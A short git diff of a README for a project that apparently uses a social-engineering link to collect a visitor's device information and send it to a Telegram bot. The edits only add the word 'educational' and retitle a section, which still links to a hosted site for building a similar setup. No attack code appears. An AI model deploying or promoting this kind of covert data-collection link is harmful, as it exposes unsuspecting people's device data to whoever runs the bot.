@@ -1,6 +1,6 @@
 ## 🧑‍💻 K4geN1nja
 
-This **open-source** project demonstrates how hackers use social engineering to collect a user's device information through a malicious link. Learn how this method works and how to protect yourself.
+This **open-source** educational project demonstrates how hackers use social engineering to collect a user's device information through a malicious link. Learn how this method works and how to protect yourself.
 
 ---
 
@@ -42,9 +42,9 @@ https://yourdomain.com/index.html?token=your_token&id=your_chatid
 
 ---
 
-## ⚙️ Build Your Own Site
+## ⚙️ Test this
 
-Create a similar setup by entering your **Telegram Bot Token** and **Chat ID** on the platform below 🔒
+Create a educational similar setup by entering your **Telegram Bot Token** and **Chat ID** on the platform below 🔒
 
 > [▶️ Launch Test Site](https://vide0chat.vercel.app/)
 
